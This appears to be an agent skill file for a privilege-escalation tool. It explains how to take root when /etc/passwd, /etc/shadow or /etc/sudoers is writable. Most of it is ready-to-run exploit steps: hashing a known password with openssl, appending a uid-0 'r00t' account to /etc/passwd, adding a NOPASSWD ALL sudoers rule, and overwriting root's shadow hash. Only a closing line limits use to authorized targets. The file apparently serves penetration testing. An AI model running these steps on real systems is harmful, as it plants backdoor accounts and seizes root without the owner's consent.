---
name: critical-file-write
description: Escalate via a CONFIRMED writable critical system file such as /etc/passwd, /etc/shadow, or /etc/sudoers.
---

# Critical file write

If a root-owned authentication file is writable by you, you can grant yourself
root directly.

## When to use

confirmesc reports a finding like:

```
[CONFIRMED] Critical system file is writable: /etc/passwd
```

`CONFIRMED` means `os.access` confirmed write permission on the file.

## How to exploit

- `/etc/passwd`: append a uid-0 user with a known password hash, then switch to
  it.

```bash
openssl passwd -1 -salt abc password123        # produce a hash
echo 'r00t:<hash>:0:0::/root:/bin/bash' >> /etc/passwd
su r00t
```

- `/etc/sudoers` or `/etc/sudoers.d/*`: add a rule like
  `<you> ALL=(ALL) NOPASSWD: ALL`, then run `sudo -i`.
- `/etc/shadow`: replace the root hash with a known one, then `su root`.

## Verify

`su` or `sudo` into root and run `id`.

## Rules

- Authorized targets only. Back up the original file first and restore it
  afterwards.
